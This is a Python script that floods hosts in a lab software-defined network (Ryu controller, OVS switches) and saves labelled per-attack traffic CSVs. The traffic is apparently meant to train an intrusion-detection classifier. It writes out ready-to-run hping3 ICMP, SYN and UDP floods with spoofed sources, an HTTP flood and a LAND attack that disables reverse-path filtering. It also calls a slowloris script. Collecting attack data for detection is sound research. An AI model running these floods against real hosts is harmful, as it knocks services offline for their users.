"""run_attack.py - Generate labeled attack traffic, one CSV file per attack type.

Usage
-----
    sudo python3 run_attack.py

Each attack writes to its own CSV file (e.g. traffic_ICMP_flood.csv).
This eliminates cross-attack contamination: every row in a file belongs
to exactly one attack type with no background protocol noise from others.

After collection, run label_dataset.py or directly use the per-attack CSVs
in the classifier notebook without needing timestamp-based labelling at all.

IMPORTANT: NORMAL_COLLECTION_MODE = False, ATTACK_COLLECTION_MODE = True in monitor.py
IMPORTANT: monitor.py must write to the path set in CSV_PATH below before each attack.
"""

import os
import subprocess
import time
import json
from dotenv import load_dotenv
load_dotenv()

DEFAULT_DURATION = 140
PAUSE            = 50
LOG_PATH         = '../ryu-controller/run_attack_log.json'
CSV_DIR          = '../ryu-controller/'
MONITOR_CSV_PATH = '../ryu-controller/traffic_attack_raw.csv' # path monitor.py writes to

COLLECTION_MODE = os.getenv('NORMAL_COLLECTION_MODE', 'False').lower() == 'true' or os.getenv('ATTACK_COLLECTION_MODE', 'False').lower() == 'true'
IS_PROD = not COLLECTION_MODE 

print(f'[+] Running in {"PROD" if IS_PROD else "COLLECTION"} mode.')

EXTERNAL_ATTACKS = [
    {
        'name': 'ICMP_flood',
        'cmds': [
            'hping3 --icmp --flood --rand-source 192.168.10.10',
        ],
    },
    {
        'name': 'SYN_flood',
        'cmds': [
            'hping3 -S --flood --rand-source -p 80 192.168.10.10',
        ],
    },
    {
        'name': 'UDP_flood',
        'cmds': [
            'hping3 --udp --flood --rand-source -p 80 192.168.10.10',
        ],
    },
    {
        'name': 'HTTP_flood',
        'cmds': [
            'ab -n 999999 -c 200 http://192.168.10.10/ || '
            'while true; do wget -q -O /dev/null http://192.168.10.10; done',
        ],
    },
    {
        'name': 'LAND_attack',
        'cmds': [
            'echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter && '
            'echo 0 > /proc/sys/net/ipv4/conf/default/rp_filter && '
            'hping3 -S --flood --spoof 192.168.10.10 192.168.10.10 -p 80',
        ],
    },
]

INTERNAL_ATTACKS = [
    {
        'name': 'SLOWLORIS',
        'cmds': ['python3 ../services/attacks/slowloris.py'],
        'duration': 500,
    },
    {
        'name': 'UDP_flood',
        'cmds': [
            'hping3 --udp --flood --spoof 192.168.20.101 -p 53 192.168.20.12',
            'hping3 --udp --flood --spoof 192.168.20.102 -p 53 192.168.20.12',
            'hping3 --udp --flood --spoof 192.168.20.103 -p 53 192.168.20.12',
        ],
    },
]


def determine_attack_suite():
    try:
        result = subprocess.run(['hostname', '-I'], capture_output=True, text=True)
        ips = result.stdout.strip().split()
        for ip in ips:
            if ip.startswith('10.'):
                print(f'[+] Detected external IP ({ip}). Loading EXTERNAL_ATTACKS.')
                return EXTERNAL_ATTACKS
            elif ip.startswith('192.168.20.'):
                print(f'[+] Detected internal IP ({ip}). Loading INTERNAL_ATTACKS.')
                return INTERNAL_ATTACKS
    except Exception as e:
        print(f'[-] Could not read IPs automatically: {e}')

    while True:
        choice = input('[?] Run (E)xternal or (I)nternal attacks? [e/i]: ').strip().lower()
        if choice.startswith('e'):
            return EXTERNAL_ATTACKS
        elif choice.startswith('i'):
            return INTERNAL_ATTACKS
        print("Please enter 'e' or 'i'.")


def reset_monitor_csv(attack_name):
    """Clear only the attack raw CSV, never touching traffic_log.csv."""
    print(f'\n[+] Clearing CSV for clean collection...')
    if os.path.exists(MONITOR_CSV_PATH):
        with open(MONITOR_CSV_PATH, 'r') as f:
            header = f.readline()
        with open(MONITOR_CSV_PATH, 'w') as f:
            f.write(header)
        print(f'[+] Cleared {MONITOR_CSV_PATH} for {attack_name}')
    else:
        print(f'[!] {MONITOR_CSV_PATH} not found - monitor may not be running')
   
def snapshot_csv(attack_name):
    """
    Copy the current monitor CSV to a per-attack file and stamp Attack_type.
    Called after each attack finishes.
    """
    import pandas as pd

    if not os.path.exists(MONITOR_CSV_PATH):
        print(f'[!] No CSV found at {MONITOR_CSV_PATH}, skipping snapshot.')
        return

    df = pd.read_csv(MONITOR_CSV_PATH)
    if df.empty:
        print(f'[!] CSV is empty for {attack_name}, skipping snapshot.')
        return

    # stamp labels - every row in this file is from this attack window
    df['Traffic']     = 'Attack'
    df['Attack_type'] = attack_name

    out_path = os.path.join(CSV_DIR, f'traffic_{attack_name}.csv')

    # append if file exists, write with header if new
    file_exists = os.path.exists(out_path)
    df.to_csv(out_path, mode='a', header=not file_exists, index=False)

    print(f'[+] {"Appended" if file_exists else "Created"} {len(df)} rows to {out_path}')

def flush_ovs_flows():
    """Delete all learned flow entries from all switches before next attack."""
    for switch in ['s1', 's2', 's3']:
        subprocess.run(
            f'ovs-ofctl -O OpenFlow13 del-flows {switch} '
            f'cookie=0xdeadbeef/-1',
            shell=True,
            capture_output=True,
            text=True
        )
    print('[+] Flushed OVS flow tables on s1, s2, s3')
    # Wait for RYU to reinstall table-miss and DMZ rules
    time.sleep(15)

ATTACKS = determine_attack_suite()

log = []

os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
if os.path.exists(LOG_PATH):
    with open(LOG_PATH, 'r') as f:
        loaded_log = json.load(f)
        if isinstance(loaded_log, list):
            log = loaded_log


for attack in ATTACKS:
    duration = attack.get('duration', DEFAULT_DURATION)

    # clear the monitor CSV before starting so only this attack's flows are captured
    flush_ovs_flows()
    if not IS_PROD:
        reset_monitor_csv(attack['name'])

    # pause after clearing so monitor writes a fresh header on next poll and fresh flows only
    time.sleep(15)

    print(f'[+] Starting {attack["name"]} (duration={duration}s)...')
    start = time.time()

    procs = []
    for cmd in attack['cmds']:
        p = subprocess.Popen(cmd, shell=True)
        procs.append(p)

    time.sleep(duration)

    for p in procs:
        p.terminate()
        p.wait()

    end = time.time()

    if not IS_PROD:
        # snapshot the CSV immediately after attack stops
        snapshot_csv(attack['name'])

    existing_entry = next((entry for entry in log if entry.get('attack_type') == attack['name']), None)

    if existing_entry is None:
        log.append({
            'attack_type': attack['name'],
            'start':       [start],
            'end':         [end],
        })
    else:
        existing_entry['start'].append(start)
        existing_entry['end'].append(end)

    print(f'    start : {start:.2f}')
    print(f'    end   : {end:.2f}')
    print(f'[+] {attack["name"]} done. Pausing {PAUSE}s...')
    time.sleep(PAUSE)

with open(LOG_PATH, 'w') as f:
    json.dump(log, f, indent=2)

print(f'\nAttack log saved to {LOG_PATH}')
print(f'\nPer-attack CSV files written to {CSV_DIR}:')
for attack in ATTACKS:
    path = os.path.join(CSV_DIR, f'traffic_{attack["name"]}.csv')
    if os.path.exists(path):
        print(f'  {path}')